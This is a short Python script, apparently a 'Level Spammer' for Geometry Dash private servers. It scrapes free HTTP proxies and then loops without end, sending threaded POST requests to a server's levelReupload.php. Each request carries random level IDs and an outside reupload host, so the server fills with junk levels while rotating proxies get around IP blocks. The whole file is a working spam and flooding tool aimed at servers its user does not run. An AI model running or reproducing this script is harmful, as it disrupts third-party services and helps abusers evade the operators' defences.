import requests
import threading
import re
import time
import random
import time
import os
from threading import Thread
# sorry for the shitcode, im bad at python

def clean():
    os.system('cls')

print("Level Spammer")
a = 0
choice = int(input("1. Level Spam for GDPS 2.1 - 2.2\n2. Level Spam for GDPS 1.9 - 2.0\n3. Scrape HTTP Proxies\n"))

def generate_proxies():
    file = open("proxies.txt","w")
    file.write("")
    file.close()
    proxy_file = open("proxies.txt", "a+")
    request = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
    for proxy in request.text.split("\n"):
        proxy = proxy.strip()
        if proxy:
            proxy_file.write(str(proxy)+"\n")
            time.sleep(0.01)

def get_random_proxy():
    return random.choice(open("proxies.txt").read().splitlines())
    
def shit():
    response = requests.post(url, data=data, proxies={"http": f"{get_random_proxy()}"})
        
if choice == 3:
    clean()
    print("Please wait...")
    generate_proxies()
    time.sleep(5)
    clean()
    choice = int(input("1. Level Spam for GDPS 2.1 - 2.2\n2. Level Spam for GDPS 1.9 - 2.0\n3. Scrape HTTP Proxies\n"))
    
if choice == 1:
    clean()
    urlgd21 = input("Enter levelReupload.php link for 2.1 - 2.2 GDPS\n")
    while True:
        a += 1
        url = urlgd21
        data = {
            "levelid": f"{random.randint(50,900000)}",
            "server": f"https://shitshit.sumhex.repl.co/level/{random.randint(50,900000)}/{random.randint(50,900000)}",
            "debug": "0"
        }
        threading.Thread(target=shit).start()
        print("Level uploaded successfully.")
        time.sleep(0.3)
        
if choice == 2:
    clean()
    urlgd20 = input("Enter levelReupload.php link for 1.9 - 2.0 GDPS\n")
    while True:
        a += 1
        url = urlgd20
        data = {
            "levelid": f"{random.randint(50,900000)}",
            "server": f"https://shitshit.sumhex.repl.co/level19/{random.randint(50,900000)}/{random.randint(50,900000)}",
            "debug": "0"
        }
        threading.Thread(target=shit).start()
        print("Level uploaded successfully.")
        time.sleep(0.3)
